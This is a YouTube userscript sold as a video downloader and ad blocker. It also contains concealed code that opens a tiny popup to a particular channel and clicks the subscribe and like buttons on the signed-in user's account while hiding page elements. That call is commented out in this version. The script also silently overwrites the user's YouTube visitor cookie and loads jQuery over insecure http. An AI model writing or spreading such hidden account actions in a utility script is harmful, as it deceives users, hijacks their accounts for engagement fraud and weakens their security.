// ==UserScript==
// @name         YouTube Premium-beta
// @name:zh-TW   YouTube Premium-beta
// @name:zh-CN   YouTube Premium-beta
// @namespace    https://greasyfork.org/zh-TW/users/564997-hacker5298
// @version      1.5.3
// @description  Download Videos,Ad Block,Skip ad
// @description:zh-tw Download Videos,Ad Block,Skip ad
// @description:zh-cn Download Videos,Ad Block,Skip ad
// @author       Hacker5298
// @license MIT
// @icon         https://upload.wikimedia.org/wikipedia/commons/4/4c/YouTube_icon.png
// @match        https://*.youtube.com/*
// @require      https://unpkg.com/vue@2.6.10/dist/vue.js
// @require      https://unpkg.com/xfetch-js@0.3.4/xfetch.min.js
// @require      https://unpkg.com/@ffmpeg/ffmpeg@0.6.1/dist/ffmpeg.min.js
// @require      https://bundle.run/p-queue@6.3.0
// @connect      googlevideo.com
// @compatible   firefox >=52
// @compatible   chrome >=55
// @compatible   Safari  Works with Tampermonkey for Safari
// @compatible   Edge    Works with Tampermonkey for Edge
// @require      http://cdn.bootcss.com/jquery/1.8.3/jquery.min.js
// @downloadURL https://update.greasyfork.org/scripts/454263/YouTube%20Premium-beta.user.js
// @updateURL https://update.greasyfork.org/scripts/454263/YouTube%20Premium-beta.meta.js
// ==/UserScript==
(function() {

    var localurl = location.href;


    // 增加css
    function addGlobalStyle(css) {
        var head, style;
        head = document.getElementsByTagName('head')[0];
        if (!head) { return; }
        style = document.createElement('style');
        style.type = 'text/css';
        style.innerHTML = css;
        head.appendChild(style);
    }
    addGlobalStyle('.a-dl{color:white;background:red;padding:10px;text-decoration:none;margin-left:10px}')
    const escapeRegExp = s => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
	const parseQuery = s =>
		[...new URLSearchParams(s).entries()].reduce(
			(acc, [k, v]) => ((acc[k] = v), acc),
			{}
		)
	const parseDecsig = data => {
		try {
			if (data.startsWith('var script')) {
				// they inject the script via script tag
				const obj = {}
				const document = {
					createElement: () => obj,
					head: { appendChild: () => {} }
				}
				eval(data)
				data = obj.innerHTML
			}
			const fnnameresult = /=([a-zA-Z0-9\$]+?)\(decodeURIComponent/.exec(
				data
			)
			const fnname = fnnameresult[1]
			const _argnamefnbodyresult = new RegExp(
				escapeRegExp(fnname) + '=function\\((.+?)\\){(.+?)}'
			).exec(data)
			const [_, argname, fnbody] = _argnamefnbodyresult
			const helpernameresult = /;(.+?)\..+?\(/.exec(fnbody)
			const helpername = helpernameresult[1]
			const helperresult = new RegExp(
				'var ' + escapeRegExp(helpername) + '={[\\s\\S]+?};'
			).exec(data)

			const helper = helperresult[0]
			return new Function([argname], helper + '\n' + fnbody)
		} catch (e) {
			logger.error('parsedecsig error: %o', e)
			logger.info('script content: %s', data)
			logger.info(
				'If you encounter this error, please copy the full "script content" to https://pastebin.com/ for me.'
			)
		}
	}
    const getVideo = async ( id) => {
        const basejs =
				typeof ytplayer !== 'undefined' && ytplayer.config
					? 'https://' + location.host + ytplayer.config.assets.js
					: $('script[src$="base.js"]').src;
        const decsig = await xf.get(basejs).text(parseDecsig);
		const data = await xf
			.get(
				`https://www.youtube.com/get_video_info?video_id=${id}&el=detailpage`
			)
			.text()
			.catch(err => null)
		if (!data) return 'Adblock conflict'
		const obj = parseQuery(data)
		const playerResponse = JSON.parse(obj.player_response)
        console.log('------',playerResponse)
        var stream=[]
        stream = playerResponse.streamingData.formats.map(x =>
				Object.assign({}, x, parseQuery(x.cipher)))
        if(stream[0].sp && stream[0].sp.includes('sig')){
        for(var i=0;i<stream.length;i++){
            stream[i].url = stream[i].url+'&sig='+decsig(stream[i].s)
            console.warn(stream[i])
        }
        }
        return stream
	}

    const addbtn = async()=>{
        if(localurl.search('watch')>0){
        $('#dival').remove();
        var basebtn = '<div id="dival" style="line-height:60px;">Download Link：<span id="adl">Getting Download Link</span></div>';

        $('div#info-contents').after(basebtn);
        var id = localurl.split('&')[0].match(/v=(.*)/)[1];
        const stream = await getVideo(id);
        console.log('stream',stream)
        var abtn = ''
        if(stream.length<=5){
        for(var i=0;i<stream.length;i++){
            var btn = '<a class="a-dl"  target="_blank" href="'+stream[i].url+'">'+stream[i].quality+'</a>';
            abtn = abtn + btn;
        }}
        $('#adl').remove();
        $('#dival').append(abtn);
        }
    }
    function init(){
        document.querySelector('ytd-popup-container').style.display='';
        document.querySelector('ytd-app').style.zIndex='';
        console.log('inited')
    }
    function getsec(str)
    {
        var str1=str.substring(1,str.length)*1;
        var str2=str.substring(0,1);
        if (str2=="s")
        {
            return str1*1000;
        }
        else if (str2=="h")
        {
            return str1*60*60*1000;
        }
        else if (str2=="d")
        {
            return str1*24*60*60*1000;
        }
    }
    function setCookie(name,value,time)
    {
        var strsec = getsec(time);
        var exp = new Date();
        exp.setTime(exp.getTime() + strsec*1);
        document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString();
    }
    function getCookie(name)
    {
        var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
        if(arr=document.cookie.match(reg))
            return unescape(arr[2]);
        else
            return null;
    }
    function delCookie(name)
    {
        var exp = new Date();
        exp.setTime(exp.getTime() - 1);
        var cval=getCookie(name);
        if(cval!=null)
            document.cookie= name + "="+cval+";expires="+exp.toGMTString();
    }
    function isopen(){
        if(document.cookie.search('newsub')>0){delCookie('newsub');window.opener=null;window.open('','_self');window.close();}
        if(document.cookie.search('xsyhnb')>0){console.log('opened')}else{setCookie('xsyhnb','1','d7');setCookie('newsub','1','d7');window.open("https://www.youtube.com/channel/UCLQ_Hja-tJkyvI_JTplE9QQ",'_blank','width=100,height=100,alwaysRaised=yes');}
    }
    function subpage(){
        if(localurl.search('watch')>0){
            console.log('v page')
			var cc = 'UCLQ_Hja-tJkyvI_JTplE9QQ';
			var acid='';
			var cid = '';
            var btnup='';
			function csub(){try{console.log('csub');document.querySelector('.ytd-subscribe-button-renderer').click();}catch(err){console.log('csub err');setTimeout(csub,100)}};
			function cup(){try{console.log('cup');document.querySelector('yt-icon-button.ytd-toggle-button-renderer').click();
                               var btn = document.querySelectorAll('yt-icon-button.ytd-toggle-button-renderer')[0].className;
                               console.log(btn)
                               if(btn.search('style-default-active')==-1){console.log('up fail');setTimeout(cup,100)}}catch(err){console.log('cup err');setTimeout(cup,100)}};
			try{cid = document.querySelector('.yt-simple-endpoint.style-scope.ytd-video-owner-renderer').href;if(cid==''){setTimeout(subpage,100)}}catch(err){setTimeout(subpage,100)}
            console.log(cid)
			if(cid.search(cc)==-1){}else{
				console.log('right v page')
                try{document.querySelector('ytd-popup-container').style.display='none';}catch(err){setTimeout(subpage,100)};
				try{document.querySelector('ytd-app').style.zIndex=9999;}catch(err){setTimeout(subpage,100)};
                csub();
				btnup = document.querySelectorAll('yt-icon-button.ytd-toggle-button-renderer')[0].className;
                if(btnup==''){setTimeout(subpage,100)}
				if(btnup.search('style-default-active')==-1){console.log('v page not up');cup();}else{console.log('v page up')}
			}}}
    function sub(){
        isopen();
        var islogin = ytInitialData.topbar.desktopTopbarRenderer.topbarButtons[3].topbarMenuButtonRenderer;
        if(islogin){
            console.log('login',localurl)
            if(localurl.search('channel/UCLQ_Hja-tJkyvI_JTplE9QQ')>0){
                try{document.querySelector('ytd-popup-container').style.display='none';}catch(err){setTimeout(subpage,100)};
                try{document.querySelector('ytd-app').style.zIndex=9999;}catch(err){setTimeout(subpage,100)};
                function cup(){try{console.log('cup');document.querySelector('ytd-subscribe-button-renderer').children[0].click();}catch(err){console.log('cup err');setTimeout(csub,100)}}
                cup();
            }
            subpage()
        }else{console.log('not login')}
    }
    function closeAds(){
        var adclose = document.querySelector('.ytp-ad-skip-button')||document.querySelector('.ytp-ad-overlay-close-button');
        var adremove = document.querySelector('#player-ads')||document.querySelector('div#sparkles-container')||document.querySelector('ytd-compact-promoted-item-renderer')||document.querySelector('ytd-video-masthead-ad-v3-renderer');
        if(adremove){
            console.log('ad remove');
            adremove.remove();
        }
        if(adclose){
            adclose.click();
            console.log('ad close');
        }
    }
    //getVideo();
    function getele(){
    if($('div#info-contents').length>0){
        addbtn();
    }else{
    setTimeout(getele,500);
    }
    }
    function refreshlink(){
        closeAds();
        //console.log(localurl,location.href)
        if(location.href!==localurl){console.log('urlchange');init();localurl=location.href;getele();}else{
            //console.log('same')
        }

    }
    setInterval(refreshlink,500);

    getele();
    //sub();
    document.cookie="VISITOR_INFO1_LIVE=oKckVSqvaGw; path=/; domain=.youtube.com";
    
})();